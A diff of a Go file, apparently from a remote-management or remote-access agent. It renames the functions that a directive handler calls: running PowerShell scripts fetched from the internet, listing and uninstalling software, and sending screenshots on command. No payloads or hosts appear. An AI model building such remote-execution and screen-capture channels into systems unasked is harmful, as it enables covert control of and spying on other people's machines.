@@ -16,15 +16,15 @@ func HandleDirective(directive c.Directive) {
 	switch directive.Command {
 	case "powershell":
 		if len(directive.Parameters) > 0 {
-			executePowershellScriptFromInternet(directive.Parameters[0])
+			ExecutePowershellScriptFromInternet(directive.Parameters[0])
 		} else {
 			log.Println("Invalid directive received.")
 		}
 
 	case "listsoftware":
-		getInstalledSoftware()
+		GetInstalledSoftware()
 	case "uninstall":
-		uninstallSoftware(directive.Parameters)
+		UninstallSoftware(directive.Parameters)
 	case "screenshot":
 		crossplatform.TakeAndSendScreenshot()
 
